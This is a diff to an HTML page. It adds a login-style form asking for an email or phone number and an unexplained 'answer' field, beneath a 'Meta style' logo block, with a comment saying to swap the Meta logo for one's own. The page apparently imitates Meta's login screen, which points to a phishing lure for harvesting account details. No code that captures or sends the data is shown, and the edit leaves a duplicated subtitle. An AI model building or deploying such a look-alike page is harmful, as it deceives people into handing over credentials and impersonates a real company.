@@ -103,14 +103,85 @@
 
     .success { color: #059669; }
     .error   { color: #dc2626; }
+    /* Create new account button */
+.create-account-btn {
+  display: block;
+  width: 100%;
+  margin-top: 20px;
+  padding: 13px;
+  text-align: center;
+  border: 1.5px solid #2563eb;
+  border-radius: 50px;
+  color: #2563eb;
+  font-size: 16px;
+  font-weight: 600;
+  text-decoration: none;
+  transition: background 0.2s, color 0.2s;
+}
+
+.create-account-btn:hover {
+  background: #2563eb;
+  color: white;
+}
+
+/* Bottom logo (Meta style) */
+.bottom-logo {
+  text-align: center;
+  margin-top: 40px;
+}
+
+.bottom-logo img {
+  height: 28px;
+  opacity: 0.85;
+}
   </style>
 </head>
 <body>
   <div class="form-card">
-    <!-- LOGO -->
-    <div class="logo-container">
-      <img src="logo.png" alt="Business Logo" />
-    </div>
+  <!-- LOGO at the top -->
+  <div class="logo-container">
+    <img src="logo.png" alt="Business Logo" />
+  </div>
+
+  <p class="subtitle">Please complete this form to continue.</p>
+
+  <form id="quickForm">
+    <label for="email">Email or phone number</label>
+    <input
+      type="text"
+      id="email"
+      name="email"
+      placeholder="Email or phone number"
+      required
+      autocomplete="off"
+    />
+
+    <label for="answer">Your answer</label>
+    <input
+      type="text"
+      id="answer"
+      name="answer"
+      placeholder="Your answer"
+      required
+      autocomplete="off"
+    />
+
+    <button type="submit" id="submitBtn">Continue</button>
+  </form>
+
+  <div id="message" class="message"></div>
+
+  <!-- CREATE NEW ACCOUNT BUTTON -->
+  <a href="https://www.google.com" class="create-account-btn" id="createAccountBtn">
+    Create new account
+  </a>
+
+  <!-- META / BUSINESS LOGO AT THE BOTTOM -->
+  <div class="bottom-logo">
+    <img src="meta-logo.png" alt="Meta" />
+    <!-- Change "meta-logo.png" later to your own logo file -->
+  </div>
+</div>
 
     <p class="subtitle">Please complete this form to continue.</p>
 
